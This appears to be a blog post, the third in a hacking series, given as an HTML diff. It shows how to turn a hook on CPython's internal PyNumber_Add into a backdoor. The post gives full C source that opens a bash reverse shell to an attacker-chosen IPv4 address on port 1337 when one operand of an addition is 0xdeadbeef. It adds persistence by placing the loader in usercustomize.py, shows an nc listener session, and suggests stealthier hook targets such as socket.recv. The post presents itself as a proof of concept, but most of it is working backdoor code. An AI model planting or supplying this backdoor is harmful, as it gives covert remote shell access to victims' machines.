@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Sneaky Snek: Messing with Python&#39;s Internal Functions (Part III) | Astral</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="We’re back with another part of the series! In the previous part, we’ve hooked PyNumber_Add function using ctypes and replaced it with our own implementation.In this part, we will extend our extension">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sneaky Snek: Messing with Python&#39;s Internal Functions (Part III)">
+<meta property="og:url" content="https://astral.page/2023/07/04/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-III/index.html">
+<meta property="og:site_name" content="Astral">
+<meta property="og:description" content="We’re back with another part of the series! In the previous part, we’ve hooked PyNumber_Add function using ctypes and replaced it with our own implementation.In this part, we will extend our extension">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-07-04T01:02:15.000Z">
+<meta property="article:modified_time" content="2023-07-04T00:10:10.693Z">
+<meta property="article:author" content="Astral">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Astral" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/css/images/favicon.ico">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Astral</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">a space for growth ✨</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/about">About</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://astral.page"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-III" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/07/04/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-III/" class="article-date">
+  <time class="dt-published" datetime="2023-07-04T01:02:15.000Z" itemprop="datePublished">2023-07-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Sneaky Snek: Messing with Python&#39;s Internal Functions (Part III)
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>We’re back with another part of the series!</p>
+<p>In the <a href="2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-II/">previous part</a>, we’ve hooked <code>PyNumber_Add</code> function using <code>ctypes</code> and replaced it with our own implementation.<br>In this part, we will extend our extension to a backdoor that will return a reverse shell given specific addition operands.</p>
+<p>To the drawing board!</p>
+<h3 id="The-Plan"><a href="#The-Plan" class="headerlink" title="The Plan"></a>The Plan</h3><ul>
+<li>Just like in the previous part, we will hook the <code>PyNumber_Add</code> function</li>
+<li>Our code will check if one of the operands is <code>0xdeadbeef</code>.</li>
+<li>If so, it will extract the other operand and use it as an IPv4 address</li>
+<li>It will then connect to the address on port 1337 and spawn a reverse shell</li>
+</ul>
+<h3 id="Adding-our-trigger"><a href="#Adding-our-trigger" class="headerlink" title="Adding our trigger"></a>Adding our trigger</h3><p>In our previous implementation, after checking that both operands are integers, we added a check to see if they are both equal to <code>2</code>.<br>We will replace this check with a check to see if one of the operands is <code>0xdeadbeef</code>, and if so, we will extract the other operand and use it as an IPv4 address.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ipNum = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> ip[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (PyLong_Check(a) &amp;&amp; PyLong_Check(b)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (PyLong_AsLong(a) == <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">        ipNum = PyLong_AsLong(b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (PyLong_AsLong(b) == <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">        ipNum = PyLong_AsLong(a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Addition implementation</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="IP-Extraction-and-Reverse-shell"><a href="#IP-Extraction-and-Reverse-shell" class="headerlink" title="IP Extraction and Reverse shell"></a>IP Extraction and Reverse shell</h3><p>Since we have access to the Python C API, we have the freedom to run any Python code we want!</p>
+<p>We will use the <code>os</code>, <code>socket</code> and <code>subprocess</code> modules to spawn a reverse shell. To avoid string formatting in C, we will use <code>strcat</code> to concatenate the strings. The IP address is extracted one byte at a time, using bit shifting and masking with <code>0xff</code> to get the lowest byte each time.</p>
+<p>The reverse shell itself is a Python one-liner that uses <code>os.dup2</code> to duplicate the socket file descriptor to the standard input, output and error, and then uses <code>subprocess.call</code> to spawn a shell.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> revShell[<span class="number">4096</span>] = <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ipNum != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// Convert the IP address to a string</span></span><br><span class="line">    <span class="built_in">snprintf</span>(ip, <span class="keyword">sizeof</span>(ip), <span class="string">&quot;%d.%d.%d.%d&quot;</span>, ipNum &amp; <span class="number">0xff</span>, (ipNum &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>, (ipNum &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>, (ipNum &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Connect to the IP address on port 1337 and spawn a shell</span></span><br><span class="line">    <span class="built_in">strcat</span>(revShell, ip);</span><br><span class="line">    <span class="built_in">strcat</span>(revShell, <span class="string">&quot;\&quot;,1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/bash\&quot;,\&quot;-i\&quot;]);&quot;</span>);</span><br><span class="line">    PyRun_SimpleString(revShell);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>And violà! We now have a backdoor that will spawn a reverse shell when the operands are <code>0xdeadbeef</code> and an IPv4 address.</p>
+<h3 id="Putting-it-all-together"><a href="#Putting-it-all-together" class="headerlink" title="Putting it all together"></a>Putting it all together</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Python.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">PyObject* <span class="title function_">my_add</span><span class="params">(PyObject* a, PyObject* b)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ipNum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> ip[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> revShell[<span class="number">4096</span>] = <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Increment the reference count of a and b</span></span><br><span class="line">    Py_INCREF(a);</span><br><span class="line">    Py_INCREF(b);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that a and b are both PyLongs</span></span><br><span class="line">    <span class="keyword">if</span> (!PyLong_Check(a) || !PyLong_Check(b)) &#123;</span><br><span class="line">        Py_DECREF(a);</span><br><span class="line">        Py_DECREF(b);</span><br><span class="line">        <span class="keyword">return</span> Py_None;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// PyNumber_Subtract(a, b) is equivalent to a - b,</span></span><br><span class="line">    <span class="comment">// So we can calculate a + b by doing a - (-b).</span></span><br><span class="line">    <span class="comment">// We can get -b by multiplying b by -1.</span></span><br><span class="line">    PyObject *minus_b = PyNumber_Multiply(b, PyLong_FromLong(<span class="number">-1</span>));</span><br><span class="line">    PyObject *result = PyNumber_Subtract(a, (PyObject*) minus_b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (PyLong_AsLong(a) == <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">        ipNum = PyLong_AsLong(b);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (PyLong_AsLong(b) == <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">        ipNum = PyLong_AsLong(a);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (ipNum != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(ip, <span class="keyword">sizeof</span>(ip), <span class="string">&quot;%lu.%lu.%lu.%lu&quot;</span>, (ipNum &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>, (ipNum &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, (ipNum &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, ipNum &amp; <span class="number">0xFF</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(revShell, ip);</span><br><span class="line">        <span class="built_in">strcat</span>(revShell, <span class="string">&quot;&#x27;,1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span>);</span><br><span class="line"></span><br><span class="line">        PyRun_SimpleString(revShell);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Py_DECREF(a);</span><br><span class="line">    Py_DECREF(b);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h3><p>Python looks for a startup script in the <code>site-packages/usercustomize.py</code> file, so we can drop our script from the <a href="2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-II/">previous part</a> there and it will be loaded automatically. Don’t forget to edit the Python script and change the path to <code>my_add.so</code> to the correct path on your machine.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Compile our backdoor module</span></span><br><span class="line">gcc -shared -o my_add.so -fPIC my_add.c $(python3-config --includes --ldflags)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find the user site-packages directory</span></span><br><span class="line">python -c <span class="string">&quot;import site; print(site.USER_SITE)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Edit the script and change the path to `my_add.so` to the full path of `site-packages/my_add.so` on your machine</span></span><br><span class="line">vim snek.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># Copy the our script to `site-packages/sitecustomize.py`</span></span><br><span class="line"><span class="built_in">cp</span> snek.py /home/user/.local/lib/python3.8/site-packages/usercustomize.py</span><br></pre></td></tr></table></figure>
+
+<p>Now, let’s test our backdoor!</p>
+<h3 id="Testing"><a href="#Testing" class="headerlink" title="Testing"></a>Testing</h3><p>We’ll listen on port 1337 using <code>nc</code>.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nc -vvlp 1337</span><br><span class="line">Listening on astral 1337</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s perform a simple calculation and see what happens.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ python3</span><br><span class="line">Address of my_add: 0x7face7051276</span><br><span class="line">Address of PyNumber_Add: 0x50f750</span><br><span class="line">mprotect(addr=0x50f000, size=0x1000, perms=0x7) ret=0 errno=0</span><br><span class="line">Address of shellcode trampoline: 0x7face6f90390</span><br><span class="line">memmove: 0x50f750</span><br><span class="line">1 + 1 = 2</span><br><span class="line">2 + 2 = 4</span><br><span class="line">Python 3.8.10 (default, May 26 2023, 14:05:08)</span><br><span class="line">[GCC 9.4.0] on linux</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; 1 + 1</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
+
+<p>So far so good, but does our backdoor work? <code>0x7f000001</code> is hex for <code>127.0.0.1</code>, so let’s try that!</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 0xdeadbeef + 0x7f000001</span><br></pre></td></tr></table></figure>
+
+<p>And we get a shell! Beautiful!</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Connection received on localhost 34998</span><br><span class="line">user@astral:~$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(user) gid=1000(user) <span class="built_in">groups</span>=1000(user),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)</span><br><span class="line">user@astral:~$ </span><br></pre></td></tr></table></figure>
+
+<h3 id="Notes-and-Caveats"><a href="#Notes-and-Caveats" class="headerlink" title="Notes and Caveats"></a>Notes and Caveats</h3><p>This is a proof of concept, and is not meant to be used in production (whatever “production” means for a backdoor, lol).</p>
+<p>Here are some of the things that could go wrong with this implementation:</p>
+<ul>
+<li>I’m pretty sure the current implementation breaks a lot of things, such as the <code>+</code> operator for other types, but I haven’t tested it extensively</li>
+<li>Thread safety is not guaranteed</li>
+<li>The <code>mprotect</code> call won’t work on platforms with <code>W^X</code> memory protection</li>
+<li><code>mprotect</code> won’t work on Windows</li>
+<li>The shellcode trampoline won’t work on platforms other than x86_64</li>
+<li>The inline hook is implemented in a very naive way, and overwrites the original function code of <code>PyNumber_Add</code>. A better way to implement the inline hook would be to use a trampoline, and jump to the original function code after we’re done. This requires us to allocate a page of executable memory, and copy the original function code there, and then jump to it</li>
+<li>Alternatively, we can use a hooking library such as <a target="_blank" rel="noopener" href="https://github.com/Zeex/subhook">subhook</a></li>
+<li>The reverse shell doesn’t fork a child process, so the Python process will get stuck until the reverse shell exits, and <code>stdin</code> &#x2F; <code>stdout</code> &#x2F; <code>stderr</code> won’t get redirected back to the user</li>
+</ul>
+<p>Improvements and features that can be added:</p>
+<ul>
+<li>We can use <code>mmap()</code> to get a page of executable memory and load shellcode from memory, instead of using <code>CDLL</code> to load a shared library from disk</li>
+<li>The backdoor components and it’s communication are not encrypted or obfuscated in any way</li>
+<li>A Python shell would be nice, instead of relying on <code>/bin/bash</code></li>
+<li>As an attacker, there are better hook targets than <code>PyNumber_Add</code>, such as <code>socket.recv()</code>, which is guaranteed to be called with user input in a lot of places</li>
+<li>Another option is string formatting functions, which are also used everywhere and likely to be called with user input (thanks to <a target="_blank" rel="noopener" href="https://twitter.com/HarpazDor">@HarpazDor</a> for the suggestion!)</li>
+</ul>
+<p>This was a really fun way to spend a weekend!<br>I hope you enjoyed reading this series as much as I enjoyed writing it, and maybe even learned something new along the way.</p>
+<p>Ciao for now!</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://astral.page/2023/07/04/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-III/" data-id="cljnja7p3000kduos3v586z55" data-title="Sneaky Snek: Messing with Python&#39;s Internal Functions (Part III)" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/07/04/An-Exercise-in-Self-Love-What-Would-You-Wish-for-Yourself/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">An Exercise in Self Love: What Would You Wish for Yourself?</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/documentation/" rel="tag">documentation</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/focus/" rel="tag">focus</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/food/" rel="tag">food</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gems-off-the-internet/" rel="tag">gems-off-the-internet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hacking/" rel="tag">hacking</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/internals/" rel="tag">internals</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/poetry/" rel="tag">poetry</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/self-improvement/" rel="tag">self-improvement</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tech/" rel="tag">tech</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/documentation/" style="font-size: 10px;">documentation</a> <a href="/tags/focus/" style="font-size: 17.5px;">focus</a> <a href="/tags/food/" style="font-size: 10px;">food</a> <a href="/tags/gems-off-the-internet/" style="font-size: 10px;">gems-off-the-internet</a> <a href="/tags/hacking/" style="font-size: 12.5px;">hacking</a> <a href="/tags/internals/" style="font-size: 12.5px;">internals</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/poetry/" style="font-size: 10px;">poetry</a> <a href="/tags/python/" style="font-size: 12.5px;">python</a> <a href="/tags/self-improvement/" style="font-size: 20px;">self-improvement</a> <a href="/tags/tech/" style="font-size: 15px;">tech</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/07/04/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-III/">Sneaky Snek: Messing with Python&#39;s Internal Functions (Part III)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/07/04/An-Exercise-in-Self-Love-What-Would-You-Wish-for-Yourself/">An Exercise in Self Love: What Would You Wish for Yourself?</a>
+          </li>
+        
+          <li>
+            <a href="/2023/07/04/NixOS-is-so-Cool/">NixOS is so Cool!</a>
+          </li>
+        
+          <li>
+            <a href="/2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-II/">Sneaky Snek: Messing with Python&#39;s Internal Functions (Part II)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-I/">Sneaky Snek: Messing with Python&#39;s Internal Functions (Part I)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 Astral<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
